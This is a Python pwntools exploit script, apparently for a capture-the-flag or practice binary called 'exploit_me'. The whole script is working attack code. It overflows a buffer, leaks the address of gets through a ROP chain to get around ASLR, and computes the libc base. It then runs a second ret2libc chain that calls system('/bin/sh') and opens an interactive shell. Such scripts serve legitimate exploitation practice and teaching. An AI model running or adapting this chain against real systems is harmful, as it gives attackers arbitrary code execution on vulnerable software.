#!/usr/bin/env python3

from pwn import *

# defining global context for binary, defining elf object, rop object, libc as elf object and starting process 

context.binary = binary = './exploit_me'

elf = ELF(binary)
rop = ROP(elf)
libc = ELF('/usr/lib/libc.so.6')
p = process(binary)

# creating rop chain to leak the gets function (ASLR bypass)

padding = b'A'*18      # offset for overflow
payload = padding
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])  # finds addresses of pop rdi and ret instructions and returns the 1st one
payload += p64(elf.got.gets)      # adding address of gets to payload from gots.plt
payload += p64(elf.plt.puts)	  # adding address of puts to payload from plt
payload += p64(elf.symbols.main)  # adding the address of main payload

p.recvline()
p.sendline(payload)
p.recvline()
leak = u64(p.recvline().strip().ljust(8,b'\0'))

log.info(f'Gets leak => {hex(leak)}')
libc.address = leak - libc.symbols.gets
log.info(f'Libc base => {hex(libc.address)}')


# moving to second rop chain for utilizing the leak (ret2libc exploit)

payload = padding
payload += p64(rop.find_gadget(['pop rdi','ret'])[0])
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(libc.symbols.system)

p.sendline(payload)
p.recvline()
p.interactive()
